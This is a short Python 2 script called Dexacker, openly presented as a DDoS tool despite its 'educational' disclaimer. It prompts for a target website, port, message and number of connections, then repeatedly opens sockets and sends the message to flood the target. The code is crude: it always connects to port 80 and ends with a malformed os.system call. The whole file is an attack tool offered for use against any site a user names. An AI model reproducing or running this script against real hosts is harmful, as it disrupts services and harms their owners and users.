#!/usr/bin/env python
#______________________________________#
#Dexacker is an open source tool developed by Abdelmadjd Cherfaoui
#Dexacker is designed for Educational Stuff to do a LEGAL DDOS Test and the developers is
# not responsible for ILLEGAL USES
#Contacting using:@Hexacker | fb.com/Hexacker
#http://www.hackercademy.com
#http://www.bringitsimple.com
#______________________________________#

#Importing Modules

import socket,os,sys,string

#Lunching Tool 
print "Lunching Dexacker..."
print "Remember that Dexacker is an Educational Tool\nand you are responsible for any ILLEGAL USES\nThe Developer is not responsible for your behaviors "
#Default Settings
host = raw_input("Enter the website link you want to DDOS it: ")
port = int(raw_input("Enter the port you want to Attack: "))
message = raw_input("Write the message you want to send it: ")
connections = int(raw_input("How many beat you want to make: " ))
IP = socket.gethostbyname(host)
#/
#The Attacking Function 
def Attack():
	attack = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		attack.connect((host,80))
		attack.send(message)
		attack.sendto(message, (IP,port))
		attack.send(message);
	except socket.error,msg:
		print "Connection Failed"
	print "DDOS Attack Lunched"
	attack.close()
for i in range(1,connections):
	Attack()
print "______________________________________"
print "The Operation is finished"

#this is the restaring function 
def Restart():
	program = sys.executable
	os.execl(program,program,* sys.argv)
CurDirectory = os.getcwd()


if __name__ == "__main__":
	request = raw_input("Do you start over? Y or N :")
	if request.strip() in "y Y yes Yes YES YEs yES".split():
		Restart()
	else:
		os.system(CurDirectory+"Dexacker.py")
